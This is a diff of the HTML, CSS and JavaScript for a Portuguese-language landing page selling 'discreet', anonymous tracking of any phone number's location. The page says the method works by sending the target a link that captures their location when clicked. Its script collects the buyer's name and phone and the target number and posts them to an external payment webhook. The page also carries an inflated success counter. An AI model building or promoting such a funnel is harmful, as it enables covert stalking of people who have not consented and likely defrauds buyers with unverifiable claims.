@@ -1,250 +1,244 @@
+<!-- index.html -->
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta content="Ferramenta de Localização Inteligente" property="og:title"/>
-<meta content="Acompanhe em tempo real com segurança. Ferramenta para localização inteligente de dispositivos." property="og:description"/>
-<meta content="https://www.minhafoto.xyz/static/images/preview.jpg" property="og:image"/>
-<meta content="https://www.minhafoto.xyz" property="og:url"/>
-<meta content="website" property="og:type"/>
-<meta content="Ferramenta de localização em tempo real com total privacidade e segurança." name="description"/>
-<meta charset="utf-8"/>
-<title>Ferramenta de Localização Inteligente</title>
-<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-<!-- Meta Pixel Code -->
-<script>!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '1123618309577539'); 
-fbq('track', 'PageView');
-fbq('track', 'ViewContent');
-</script>
-<noscript><img height="1" src="https://www.facebook.com/tr?id=1123618309577539&amp;ev=PageView&amp;noscript=1" style="display:none" width="1"/></noscript>
-<script type="text/javascript">
-(function(c,l,a,r,i,t,y){
-    c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-    t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-    y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-})(window, document, "clarity", "script", "s355u53m2d");
-</script>
-<style>
-body {
-    font-family: Arial, sans-serif;
-    background-image: url('static/images/fundo.jpg');
-    background-repeat: repeat;
-    background-color: #f1f1f1;
-    margin: 0;
-    padding: 0;
-    color: #333;
-}
-.topbar {
-    background: linear-gradient(90deg, #075e54, #128c7e);
-    color: white;
-    padding: 15px 10px;
-    text-align: center;
-    font-weight: bold;
-}
-.container {
-    max-width: 400px;
-    margin: 20px auto;
-    background-color: white;
-    padding: 20px;
-    border-radius: 10px;
-    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-}
-h1 { color: #2e7d32; font-size: 20px; }
-h2 { color: #333; font-size: 16px; margin-bottom: 10px; }
-.image-top img {
-    width: 250px;
-    display: block;
-    margin: 0 auto 10px auto;
-}
-input[type="tel"], input[type="text"] {
-    width: 100%;
-    padding: 8px 10px;
-    margin-top: 10px;
-    border-radius: 6px;
-    border: 1px solid #ccc;
-    font-size: 14px;
-    height: 38px;
-    box-sizing: border-box;
-}
-.cta-button {
-    display: block;
-    background-color: #25D366;
-    color: white;
-    text-align: center;
-    padding: 12px;
-    text-decoration: none;
-    border-radius: 8px;
-    font-size: 18px;
-    margin-top: 15px;
-    animation: pulse 1.5s infinite;
-    box-shadow: 0 0 0 rgba(37, 211, 102, 0.7);
-    transition: box-shadow 0.3s ease-in-out;
-    cursor: pointer;
-}
-@keyframes pulse {
-    0% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); }
-    70% { box-shadow: 0 0 10px 10px rgba(37, 211, 102, 0); }
-    100% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); }
-}
-.cta-button:hover { background-color: #1ebe5d; }
-.features {
-    text-align: left;
-    margin-top: 20px;
-    background-color: #f9f9f9;
-    padding: 15px;
-    border-radius: 8px;
-    font-size: 15px;
-}
-.features ul { padding-left: 20px; }
-.highlight { color: #d32f2f; font-weight: bold; }
-.stats {
-    background-color: #e8f5e9;
-    padding: 10px;
-    border-radius: 8px;
-    text-align: center;
-    font-size: 14px;
-    margin-top: 20px;
-}
-.footer {
-    font-size: 12px;
-    text-align: center;
-    color: #777;
-    margin-top: 10px;
-}
-</style>
+  <meta charset="utf-8" />
+  <title>Ferramenta de Localização Inteligente</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Ferramenta de localização em tempo real com total privacidade e segurança." />
+  <meta property="og:title" content="Ferramenta de Localização Inteligente" />
+  <meta property="og:description" content="Acompanhe em tempo real com segurança. Ferramenta para localização inteligente de dispositivos." />
+  <meta property="og:image" content="https://www.minhafoto.xyz/static/images/preview.jpg" />
+  <meta property="og:url" content="https://www.minhafoto.xyz" />
+  <meta property="og:type" content="website" />
+
+  <!-- Meta Pixel -->
+  <script>
+    !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1123618309577539');
+    fbq('track', 'PageView');
+    fbq('track', 'ViewContent');
+  </script>
+  <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1123618309577539&ev=PageView&noscript=1"/></noscript>
+
+  <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "s355u53m2d");
+  </script>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-image: url('static/images/fundo.jpg');
+      background-repeat: repeat;
+      background-color: #f1f1f1;
+      margin: 0;
+      padding: 0;
+      color: #333;
+    }
+    .topbar {
+      background: linear-gradient(90deg, #075e54, #128c7e);
+      color: white;
+      padding: 15px 10px;
+      text-align: center;
+      font-weight: bold;
+    }
+    .container {
+      max-width: 400px;
+      margin: 20px auto;
+      background-color: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+    }
+    h1 { color: #2e7d32; font-size: 20px; }
+    h2 { color: #333; font-size: 16px; margin-bottom: 10px; }
+    .image-top img {
+      width: 250px;
+      display: block;
+      margin: 0 auto 10px auto;
+    }
+    input[type="tel"], input[type="text"] {
+      width: 100%;
+      padding: 8px 10px;
+      margin-top: 10px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+      height: 38px;
+      box-sizing: border-box;
+    }
+    .cta-button {
+      display: block;
+      background-color: #25D366;
+      color: white;
+      text-align: center;
+      padding: 12px;
+      text-decoration: none;
+      border-radius: 8px;
+      font-size: 18px;
+      margin-top: 15px;
+      animation: pulse 1.5s infinite;
+      box-shadow: 0 0 0 rgba(37, 211, 102, 0.7);
+      transition: box-shadow 0.3s ease-in-out;
+      cursor: pointer;
+    }
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); }
+      70% { box-shadow: 0 0 10px 10px rgba(37, 211, 102, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); }
+    }
+    .cta-button:hover { background-color: #1ebe5d; }
+    .features {
+      text-align: left;
+      margin-top: 20px;
+      background-color: #f9f9f9;
+      padding: 15px;
+      border-radius: 8px;
+      font-size: 15px;
+    }
+    .features ul { padding-left: 20px; }
+    .highlight { color: #d32f2f; font-weight: bold; }
+    .stats {
+      background-color: #e8f5e9;
+      padding: 10px;
+      border-radius: 8px;
+      text-align: center;
+      font-size: 14px;
+      margin-top: 20px;
+    }
+    .footer {
+      font-size: 12px;
+      text-align: center;
+      color: #777;
+      margin-top: 10px;
+    }
+  </style>
 </head>
 <body>
-<div class="topbar">
-    Parabéns! Você ganhou acesso à ferramenta mais usada de rastreamento discreto.
-</div>
+<div class="topbar">Parabéns! Você ganhou acesso à ferramenta mais usada de rastreamento discreto.</div>
+
 <div class="container">
-<h1>Acompanhe a localização de qualquer número — 100% anônimo</h1>
-<div class="image-top"><img alt="Imagem Espião" src="static/images/logo.svg"/></div>
-<h2>Digite abaixo o número que deseja rastrear:</h2>
-<input id="telefone" placeholder="Exemplo: (11) 90000-0000" type="tel"/>
-<div class="cta-button" id="btn-acessar">✅ Acessar Rastreamento Agora!</div>
-<p style="font-size: 12px; color: #555; margin-top: 10px;">🔒 Dados protegidos com criptografia.</p>
-<div class="features">
-<h3>✅ O que você vai conseguir ver:</h3>
-<ul>
-<li>📍 Atualizações de localização </li>
-<li>📲 Histórico de locais visitados</li>
-<li>🕵️‍♂️ Ferramenta discreta para monitoramento</li>
-</ul>
-<h3 class="highlight">Esta ferramenta é 100% anônima</h3>
-<p><strong>Como funciona?</strong><br/> Você envia um link, a pessoa clica e pronto... Localização capturada!</p>
+  <h1>Acompanhe a localização de qualquer número — 100% anônimo</h1>
+  <div class="image-top"><img alt="Imagem Espião" src="static/images/logo.svg"/></div>
+  <h2>Digite abaixo o número que deseja rastrear:</h2>
+  <input id="telefone" placeholder="Exemplo: (11) 90000-0000" type="tel"/>
+  <div class="cta-button" id="btn-acessar">✅ Acessar Rastreamento Agora!</div>
+  <p style="font-size: 12px; color: #555; margin-top: 10px;">🔒 Dados protegidos com criptografia.</p>
+
+  <div class="features">
+    <h3>✅ O que você vai conseguir ver:</h3>
+    <ul>
+      <li>📍 Atualizações de localização</li>
+      <li>📲 Histórico de locais visitados</li>
+      <li>🕵️‍♂️ Ferramenta discreta para monitoramento</li>
+    </ul>
+    <h3 class="highlight">Esta ferramenta é 100% anônima</h3>
+    <p><strong>Como funciona?</strong><br>Você envia um link, a pessoa clica e pronto... Localização capturada!</p>
+  </div>
+
+  <div class="stats">
+    <p>📈 <strong>95.234</strong> números rastreados com sucesso</p>
+    <p>🕑 Ferramenta atualizada: Sexta-Feira, 25 de Junho de 2025</p>
+  </div>
+
+  <div class="footer">
+    <p>Política de Privacidade e Cookies</p>
+    <p>© 2025 – Todos os Direitos Reservados</p>
+  </div>
 </div>
-<div class="stats">
-<p>📈 <strong>95.234</strong> números rastreados com sucesso</p>
-<p>🕑 Ferramenta atualizada: Sexta-Feira, 25 de Junho de 2025</p>
+
+<!-- POPUP -->
+<div id="popupDados" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.75); z-index:9999; align-items:center; justify-content:center;">
+  <div style="background:white; padding:20px; border-radius:10px; width:90%; max-width:320px; text-align:center;">
+    <h3>🔐 Antes de prosseguir</h3>
+    <p style="font-size:14px;">Preencha seus dados para continuar:</p>
+    <input id="inputNome" placeholder="Seu nome completo" style="margin:8px 0; width:100%; padding:10px;" type="text">
+    <input id="inputTelefonePopup" placeholder="Seu telefone" style="margin:8px 0; width:100%; padding:10px;" type="tel"/>
+    <button class="cta-button" id="btnContinuar" style="margin: 10px auto; display: block;">Continuar</button>
+    <button onclick="document.getElementById('popupDados').style.display='none'" style="margin-top:10px; background:none; border:none; color:#888; text-decoration:underline; cursor:pointer;">Cancelar</button>
+  </div>
 </div>
-<div class="footer">
-<p>Política de Privacidade e Cookies</p>
-<p>© 2025 – Todos os Direitos Reservados</p>
-</div>
-</div>
-<!-- POP-UP -->
-<div id="popupDados" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%;
-  background:rgba(0,0,0,0.75); z-index:9999; align-items:center; justify-content:center;">
-<div style="background:white; padding:20px; border-radius:10px; width:90%; max-width:320px; text-align:center;">
-<h3>🔐 Antes de prosseguir</h3>
-<p style="font-size:14px;">Preencha seus dados para continuar:</p>
-<input id="inputNome" placeholder="Seu nome completo" style="margin:8px 0; width:100%; padding:10px;" type="text">
-<input id="inputTelefonePopup" placeholder="Seu telefone" style="margin:8px 0; width:100%; padding:10px;" type="tel"/>
-<button class="cta-button" id="btnContinuar" style="margin:10px auto; display:block;">Continuar</button>
-<button onclick="document.getElementById('popupDados').style.display='none'" style="margin-top:10px; background:none; border:none; color:#888; text-decoration:underline; cursor:pointer;">
-      Cancelar
-    </button>
-</input></div>
-</div>
+
 <script>
 document.addEventListener('DOMContentLoaded', function() {
-    const telefoneInput = document.getElementById('telefone');
-    const botao = document.getElementById('btn-acessar');
-    const popup = document.getElementById('popupDados');
-    const inputNomePopup = document.getElementById('inputNome');
-    const inputTelPopup = document.getElementById('inputTelefonePopup');
+  const telefoneInput = document.getElementById('telefone');
+  const botao = document.getElementById('btn-acessar');
+  const popup = document.getElementById('popupDados');
+  const inputNomePopup = document.getElementById('inputNome');
+  const inputTelPopup = document.getElementById('inputTelefonePopup');
 
-    // Máscara telefone alvo
-    telefoneInput.addEventListener('input', function(e) {
-        let valor = e.target.value.replace(/\D/g, '');
-        if (valor.length <= 10) {
-            valor = valor.replace(/^(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
-        } else {
-            valor = valor.replace(/^(\d{2})(\d{5})(\d{0,4})/, '($1) $2-$3');
-        }
-        e.target.value = valor;
-    });
+  telefoneInput.addEventListener('input', maskTel);
+  inputTelPopup.addEventListener('input', maskTel);
 
-    // Máscara telefone comprador
-    inputTelPopup.addEventListener('input', function(e) {
-        let valor = e.target.value.replace(/\D/g, '');
-        if (valor.length <= 10) {
-            valor = valor.replace(/^(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
-        } else {
-            valor = valor.replace(/^(\d{2})(\d{5})(\d{0,4})/, '($1) $2-$3');
-        }
-        e.target.value = valor;
-    });
+  function maskTel(e) {
+    let valor = e.target.value.replace(/\D/g, '');
+    if (valor.length <= 10) {
+      valor = valor.replace(/^(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
+    } else {
+      valor = valor.replace(/^(\d{2})(\d{5})(\d{0,4})/, '($1) $2-$3');
+    }
+    e.target.value = valor;
+  }
 
-    botao.addEventListener('click', function() {
-        const numero = telefoneInput.value.trim();
-        if (numero.length < 14) {
-            alert('Por favor, preencha um número de telefone válido.');
-        } else {
-            popup.style.display = 'flex';
-        }
-    });
-    
-    document.getElementById('btnContinuar').addEventListener('click', () => {
+  botao.addEventListener('click', function() {
+    const numero = telefoneInput.value.trim();
+    if (numero.length < 14) {
+      alert('Por favor, preencha um número de telefone válido.');
+    } else {
+      popup.style.display = 'flex';
+    }
+  });
+
+  document.getElementById('btnContinuar').addEventListener('click', () => {
     const nome = inputNomePopup.value.trim();
     const telComprador = inputTelPopup.value.trim();
     const numeroAlvo = telefoneInput.value.trim();
 
     if (!nome || telComprador.length < 14) {
-        alert('Por favor, preencha seus dados corretamente.');
-        return;
+      alert('Por favor, preencha seus dados corretamente.');
+      return;
     }
 
-    // Ajuste do telefone no formato internacional
-    const telefoneFormatado = "+55" + telComprador.replace(/\\D/g, '');
-    const numeroRastreadoLimpo = numeroAlvo.trim() || "";
+    const telefoneFormatado = "+55" + telComprador.replace(/\D/g, '');
+    const numeroRastreadoLimpo = numeroAlvo.trim();
 
     localStorage.setItem('numeroRastreamento', numeroAlvo);
     localStorage.setItem('nomeComprador', nome);
     localStorage.setItem('telefoneComprador', telComprador);
 
     fetch('https://backend-pix-webhook-production.up.railway.app/enviar-webhook', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            nomeComprador: nome,
-            telefoneComprador: telefoneFormatado,
-            numeroRastreamento: numeroRastreadoLimpo
-        })
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        nomeComprador: nome,
+        telefoneComprador: telefoneFormatado,
+        numeroRastreamento: numeroRastreadoLimpo
+      })
     })
     .then(res => {
-        if (res.ok) {
-            window.location.href = 'captura.html';
-        } else {
-            alert("Erro ao enviar os dados. Código: " + res.status);
-        }
+      if (res.ok) {
+        window.location.href = 'captura.html';
+      } else {
+        alert("Erro ao enviar os dados. Código: " + res.status);
+      }
     })
     .catch(() => {
-        alert("Erro ao enviar os dados. Tente novamente.");
+      alert("Erro ao enviar os dados. Tente novamente.");
     });
-});
-
-
+  });
 });
 </script>
-<script async="" data-utmify-prevent-subids="" data-utmify-prevent-xcod-sck="" defer="" src="https://cdn.utmify.com.br/scripts/utms/latest.js"></script>
+
+<script async src="https://cdn.utmify.com.br/scripts/utms/latest.js"></script>
 </body>
 </html>
